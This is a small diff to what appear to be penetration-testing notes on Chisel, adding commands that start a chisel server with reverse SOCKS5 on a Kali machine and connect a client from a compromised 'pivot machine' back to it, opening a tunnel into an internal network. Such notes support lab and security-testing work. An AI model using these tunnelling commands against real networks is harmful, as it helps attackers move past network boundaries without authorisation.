@@ -226,6 +226,13 @@ curl http://192.168.135.114
 
 Chisel creates tunnels over HTTP.
 
+Commands:
+
+```
+Kali: chisel server --socks5 --reverse
+Pivot machine: /usr/local/bin/chisel client --fingerprint <fingerprint> 192.168.152.109:8080 R:socks
+```
+
 Common use cases:
 
 ```
